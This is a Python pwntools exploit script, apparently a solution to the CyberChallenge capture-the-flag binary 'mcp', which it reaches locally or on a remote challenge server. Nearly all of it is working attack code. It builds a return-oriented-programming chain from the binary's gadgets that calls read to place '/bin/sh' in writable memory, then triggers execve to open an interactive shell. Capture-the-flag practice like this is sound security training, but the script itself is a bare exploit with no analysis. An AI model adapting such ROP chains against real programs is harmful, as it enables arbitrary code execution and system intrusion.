#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template mcp
from pwn import *

exe = context.binary = ELF('mcp')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("mcp.jeopardy.cyberchallenge.it", 4031, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak *0x4000ff
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

addr_len = 8

#rop integrata nel programma
addr1 = 0x400153
addr2 = 0x400159
addr3 = 0x40015b

#use read to read from stdin to wr_addr /bin/sh
wr_addr = 0x60016c
bin_sh = 0x0068732f6e69622e

sub_rax_syscall_ret = 0x0000000000400140 #0 per read
add_rdi_r10_ret = 0x0000000000400155 #Usato per azzerare rdi per stdin
pop_rsi_ret = 0x0000000000400159
pop_rdx_add_rdi_r10_ret = 0x0000000000400154
pop_r10_add_rdi_r10_ret = 0x0000000000400153 #Usato per azzerare rdi per stdin

#rsi buf e rdx count
payload = dict()

payload[16*addr_len] = pop_rsi_ret
payload[17*addr_len] = p64(wr_addr)
payload[18*addr_len] = pop_rdx_add_rdi_r10_ret #r10 nullo al momento
payload[19*addr_len] = p64(len("/bin/sh\x00"))
payload[20*addr_len] = pop_r10_add_rdi_r10_ret
payload[21*addr_len] = p64(0xffffffffffffffff)
payload[22*addr_len] = sub_rax_syscall_ret
payload[23*addr_len] = p64(addr1)
payload[24*addr_len] = p64(wr_addr)
payload[25*addr_len] = p64(addr2)
payload[26*addr_len] = p64(0x0)
payload[27*addr_len] = p64(addr3)

payload = flat(payload)

io.sendline(payload)

sleep(10) #terrible solution, but hey it works
io.sendline("/bin/sh\x00")
#io.sendline(b"a"*128 + addr1.to_bytes(8, "little") + b".bin/sh\x00" + addr2.to_bytes(8, "little") \
#            + p64(0) + addr3.to_bytes(8, "little"))

io.interactive()

